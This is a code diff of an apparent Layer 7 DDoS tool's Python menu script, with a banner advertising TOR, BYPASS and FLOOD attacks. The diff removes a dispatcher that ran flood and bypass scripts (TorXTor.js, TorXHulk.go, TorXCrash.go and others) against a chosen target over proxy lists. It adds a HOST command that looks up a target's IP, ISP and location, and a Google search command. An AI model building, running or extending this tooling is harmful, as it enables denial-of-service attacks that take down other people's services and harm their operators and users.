@@ -3,6 +3,9 @@ import time as t
 import sys as s
 import random as r
 import subprocess as sp
+from googlesearch import search
+import requests as re
+from bs4 import BeautifulSoup as bs
 
 
 def pro(cr, tl, br_ln=30):
@@ -133,16 +136,17 @@ def mn_lp():
                 print(
                     """
   _____      __   ___
-  |_   _|__ _ \ \ / (_)_ _ _  _ ___
-    | |/ _ \ '_\ V /| | '_| || (_-<
-    |_|\___/_|  \_/ |_|_|  \_,_/__/ 
+  |_   _|__ _ \\ \\ / (_)_ _ _  _ ___
+    | |/ _ \\ '_\\ V /| | '_| || (_-<
+    |_|\\___/_|  \\_/ |_|_|  \\_,_/__/
 
      🚨  LAYER7 ATTACK MENU  🚨
        (Top-secret Protocols)
 
         Commands available:
-   - TOR   : Attack via TOR network
-   - TOR-BYPASS: Bypass defenses
+   -  TOR   : Attack via TOR network
+   - BYPASS : Bypass defenses via TOR network
+   - FLOOD  : Flood target via TOR network
 
   """
                 )
@@ -158,91 +162,86 @@ def mn_lp():
                 ani_txt("👋 Goodbye, have a great day.", 0.02)
                 break
 
-            elif cmd in ["TOR", "FLOOD", "TLS", "NOX", "HTTPS", "BYPASS", "RESET"]:
-
+            elif cmd == "HOST":
                 try:
-                    tg = parts[1]
-                    dr = int(parts[2])
-                    mx_tm = 300
-                    st_tm = t.time()
+                    tr = parts[1]
+                    ld_ani(f"Checking hosting info for {tr}", 1.5)
+                    response = re.get(f"https://check-host.net/ip-info?host={tr}")
+                    if response.status_code == 200:
+                        soup = bs(response.text, "html.parser")
+                        ip = (
+                            soup.find("td", text="IP address")
+                            .find_next_sibling("td")
+                            .text.strip()
+                        )
+                        isp = (
+                            soup.find("td", text="ISP")
+                            .find_next_sibling("td")
+                            .text.strip()
+                        )
+                        organization = (
+                            soup.find("td", text="Organization")
+                            .find_next_sibling("td")
+                            .text.strip()
+                        )
+                        country = (
+                            soup.find("td", text="Country")
+                            .find_next_sibling("td")
+                            .text.strip()
+                        )
+                        region = (
+                            soup.find("td", text="Region")
+                            .find_next_sibling("td")
+                            .text.strip()
+                        )
 
-                    ani_txt(f"Engaging Attack on {tg} for {dr} seconds... 💥", 0.05)
-
-                    while t.time() - st_tm < dr:
-                        if cmd == "TOR":
-                            rn_cmd(
-                                f'node bin/odd/.cache/TorXTor.js GET "{tg}" {mx_tm} 50 90 bin/odd/.cache/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full'
-                            )
-                            rn_cmd(
-                                f'node bin/odd/.cache/TorXTor.js POST "{tg}" {mx_tm} 50 90 bin/odd/.cache/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full'
-                            )
-                        elif cmd == "FLOOD":
-                            rn_cmd(
-                                f"go run bin/odd/.cache/TorXHulk.go --site {tg} --data GET"
-                            )
-                            rn_cmd(
-                                f"go run bin/odd/.cache/TorXCrash.go {tg} 9999 get {mx_tm} nil"
-                            )
-                            rn_cmd(
-                                f"go run bin/odd/.cache/TorXHulk.go --site {tg} --data POST"
-                            )
-                            rn_cmd(
-                                f"go run bin/odd/.cache/TorXCrash.go {tg} 9999 POST {mx_tm} nil"
-                            )
-                        elif cmd == "TLS":
-                            rn_cmd(
-                                f"node bin/odd/.cache/TorXTls.js {tg} {mx_tm} 90 20 bin/odd/.cache/proxy.txt"
-                            )
-                            rn_cmd(
-                                f"node bin/odd/.cache/TorXDark.js {tg} {mx_tm} 90 20 bin/odd/.cache/proxy.txt"
-                            )
-                        elif cmd == "NOX":
-                            rn_cmd(
-                                f"node bin/odd/.cache/NOX.js {tg} {mx_tm} 20 90 bin/odd/.cache/proxy.txt"
-                            )
-                        elif cmd == "HTTPS":
-                            rn_cmd(
-                                f"node bin/odd/.cache/HTTPS.js POST {tg} {mx_tm} 8 8 bin/odd/.cache/proxy.txt"
-                            )
-                            rn_cmd(
-                                f"node bin/odd/.cache/HTPPSV2.js GET {tg} {mx_tm} 8 8 bin/odd/.cache/proxy.txt"
-                            )
-                        elif cmd == "BYPASS":
-                            rn_cmd(
-                                f"node bin/odd/.cache/TorXBypassV2.js {tg} {mx_tm} 90 20 bin/odd/.cache/proxy.txt"
-                            )
-                            rn_cmd(
-                                f"node bin/odd/.cache/TorXBypass.js {tg} {mx_tm} 90 20 bin/odd/.cache/proxy.txt"
-                            )
-                        elif cmd == "RESET":
-                            rn_cmd(
-                                f"node bin/odd/.cache/RESETV2.js {tg} {mx_tm} 8 8 bin/odd/.cache/proxy.txt --full"
-                            )
-                            rn_cmd(
-                                f"node bin/odd/.cache/RESET.js {tg} {mx_tm} 8 8 bin/odd/.cache/proxy.txt"
-                            )
-                        t.sleep(1)
-
+                        print(f"🌐 Hosting Information for {tr}:\n")
+                        print(f"🖥️ IP Address: {ip}")
+                        print(f"📡 ISP: {isp}")
+                        print(f"🏢 Organization: {organization}")
+                        print(f"🌍 Country: {country}")
+                        print(f"📍 Region: {region}\n")
+                    else:
+                        print(
+                            f"❌ Failed to fetch hosting information. HTTP Status: {response.status_code}"
+                        )
                 except IndexError:
-                    print("❌ Invalid Command. Usage: METHOD URL TIME")
-                    print("Example: TOR https://example.com 60")
-
-            elif cmd == "PROXY":
-                rn_cmd("python3 bin/odd/.cache/scrape.py &")
+                    print("❌ Invalid Command. Usage: HOST example.com")
+                except AttributeError:
+                    print(
+                        "❌ Unable to extract hosting information. The webpage structure may have changed."
+                    )
+                except Exception as e:
+                    print(f"❌ An error occurred: {e}")
                 continue
 
-            elif cmd == "UPDATE":
-                rn_cmd("git reset --hard HEAD && git pull origin main")
-                continue
-
-            elif cmd == "SETUP":
-                rn_cmd("sudo bash setup.sh &")
+            elif cmd == "SEARCH":
+                try:
+                    query = " ".join(parts[1:])
+                    ld_ani(f"🔍 Searching Google for '{query}'", 1.5)
+                    print(f"\n✨ Search Results for '{query}':\n")
+                    # Limit to 5 results
+                    results = search(query, num_results=5)
+                    if not results:
+                        print("❌ No search results found.")
+                    else:
+                        for idx, result in enumerate(results, 1):
+                            title, link = (
+                                result.split(" - ", 1)
+                                if " - " in result
+                                else (result, result)
+                            )
+                            print(f"🔗 {idx}. {title.strip()} ➡️ {link.strip()}")
+                except IndexError:
+                    print("❌ Invalid Command. Usage: SEARCH query")
+                except Exception as e:
+                    print(f"❌ An error occurred: {e}")
                 continue
 
             elif cmd == "HELP":
                 ld_ani("Loading Help", 1.5)
                 print(
-                    "📖 Available Commands: LAYER7, STATS, CLEAR, EXIT, HELP, UPDATE, SETUP"
+                    "📖 Available Commands: LAYER7, HOST, SEARCH, STATS, CLEAR, EXIT, HELP, UPDATE, SETUP"
                 )
                 continue
 
@@ -255,8 +254,6 @@ def mn_lp():
 
     ds_mn()
 
-def rn_cmd(cmd):
-    sp.run(cmd, shell=True)
 
 ses_srt = t.time()
 bot_cnt = sum(1 for _ in load_prxs())
